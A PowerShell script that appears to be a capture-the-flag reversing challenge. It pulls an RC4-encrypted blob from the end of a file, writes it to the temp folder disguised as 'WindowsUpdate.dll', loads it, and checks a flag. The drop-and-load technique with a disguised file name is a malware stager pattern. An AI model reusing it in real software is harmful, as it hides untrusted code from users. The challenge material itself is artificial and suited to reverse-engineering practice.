function null_func($key){
    $s=0..255
    $k=0..255
    foreach($i in 0..255){
        $k[$i]=[int]$key[$i%$key.Length]
    }
    $j=0
    foreach($i in 0..255){
        $j=($j+$s[$i]+$k[$i])%256
        $s[$i],$s[$j]=$s[$j],$s[$i]
    }
    return $s
}
function null_func2($s,$d){
    $i,$j,$t=0,0,0
    foreach($k in 0..($d.Length-1)){
        $i=($i+1)%256
        $j=($j+$s[$i])%256
        $s[$i],$s[$j]=$s[$j],$s[$i]
        $t=($s[$i]+$s[$j]+1)%256
        $d[$k]=$d[$k] -bxor $s[$t]
    }
    return $d
}
function null_func3($f){
    $m=([int]$f[-1]+([int]$f[-2] -shl 8)+([int]$f[-3] -shl 16)+([int]$f[-4] -shl 24))

    if($m -eq 0x4430434d){
        $len=[int]$f[-5]+([int]$f[-6] -shl 8)+([int]$f[-7]-shl 16)+([int]$f[-8] -shl 24)
        $s=null_func "N0thing_to_see"
        return null_func2 $s $f[(-8-$len)..-8]
    }else{
        return $null
    }
}
if ( $args.Count -lt 1 ) {
    Write-Output "flag{I think you don't need this Fake Flag}"
    Exit
}
$p=$args[0]
# Write-Output $p
$f=[System.IO.File]::ReadAllBytes($p)
$d=null_func3 $f
if($null -eq $d){
    Write-Output "flag{No Need for this fake flag}"
    Exit
}
$tpath=$env:TEMP+"\ProgramFiles\"
if ((Test-Path $tpath) -eq $false){
    mkdir $tpath
}
$tfile=$tpath+"\WindowsUpdate.dll"
[System.IO.File]::WriteAllBytes($tfile,$d)
Import-Module $tfile
$m=[HelloWorldApplication.Main1]::new()
if($true -eq $m.d($env:USERPROFILE)){
    [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
    [System.Windows.Forms.MessageBox]::show("You are Right!!!, Please submit the flag")
}